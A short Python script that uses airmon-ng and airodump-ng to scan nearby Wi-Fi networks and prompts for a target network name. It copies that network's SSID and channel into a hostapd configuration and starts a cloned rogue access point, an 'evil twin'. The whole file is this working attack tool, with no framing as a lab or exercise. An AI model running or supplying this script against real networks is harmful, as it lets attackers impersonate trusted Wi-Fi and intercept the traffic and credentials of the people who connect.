import subprocess
import csv
from threading import Timer
from os import system
import time

subprocess.call(['airmon-ng', 'start', 'wlan0'])
p = subprocess.Popen(["airodump-ng", "wlan0mon", "-w", "output", "--output-format", "csv"])
time.sleep(10)
p.terminate()

#subprocess.call(["airmon-ng", "start", "wlan0"])
#print('Press Ctrl + C to choose an Access Point')
#system('airodump-ng wlan0mon -w output --output-format csv')

macAddr = ''
channel = ''
name = ' ' + input("Type in Access Point name: ")
with open('output-01.csv', newline='') as f:
    for row in f:
        line = row.split(',')
        # If you take in some argument here instead of hardcoded AP name
        if (name in line):
            #print(line)
            macAddr = line[0]
            channel = line[3].replace(" ", "")
        #print(macAddr)
        #print(channel)

#print(name)
#print(macAddr)
#print(channel)

subprocess.call(['rm', 'hostapd.conf'])

with open('hostapd.conf', 'w') as f:
    f.write('interface=wlan0mon\n')
    f.write('driver=nl80211\n')
    f.write('ssid=' + name[1:] + '\n')
    f.write('channel=' + channel)


subprocess.call(['hostapd', 'hostapd.conf'])
